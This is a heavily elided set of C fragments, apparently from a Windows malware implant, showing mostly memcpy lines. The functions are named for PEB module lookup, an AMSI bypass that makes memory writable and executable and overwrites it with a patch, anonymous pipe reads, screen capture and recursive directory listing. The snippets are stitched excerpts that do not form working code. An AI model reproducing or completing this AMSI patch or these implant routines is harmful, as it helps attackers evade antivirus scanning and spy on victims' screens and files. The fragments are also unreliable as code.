...
PVOID LdrModulePebByString(
    ...
    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
        ...
        if ( Ldr->BaseDllName.Length <= 260 ) {
            ...
            memcpy( Name, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
...
BOOL BypassPatchAMSI(
    ...
    if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) ) {
        memcpy( pAddress, amsiPatch, sizeof(amsiPatch) );
...
VOID AnonPipesRead(
    ...
    do {
        ...
        memcpy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
        memset( buf, 0, dwRead );
    } while ( Success == TRUE );
...
BOOL WinScreenshot(
    ...
    memcpy( BitMapImage, &BitFileHdr, sizeof( BITMAPFILEHEADER ) );
    memcpy( BitMapImage + sizeof( BITMAPFILEHEADER ), &BitInfoHdr, sizeof( BITMAPINFOHEADER ) );
    memcpy( BitMapImage + sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ), bBits, cbBits );
    ...
    IN UINT32 MaxLevelDeep)
{
    ...
    memcpy( Path, StartPath, PathSize * sizeof( WCHAR ) );
    ...
    memcpy( RootDir->Path, Path, MIN( MAX_PATH, StringLengthW( Path ) ) * sizeof( WCHAR ) );
    ...
    do
    {
        ...
        if ( IsDir && SubDirs )
        {
            ...
            memcpy( SubDir->Path, Path, ( PathSize - 1 ) * sizeof( WCHAR ) );
        ...
        memcpy( DirOrFile->FileName, FindData.cFileName, StringLengthW( FindData.cFileName ) * sizeof( WCHAR ) );
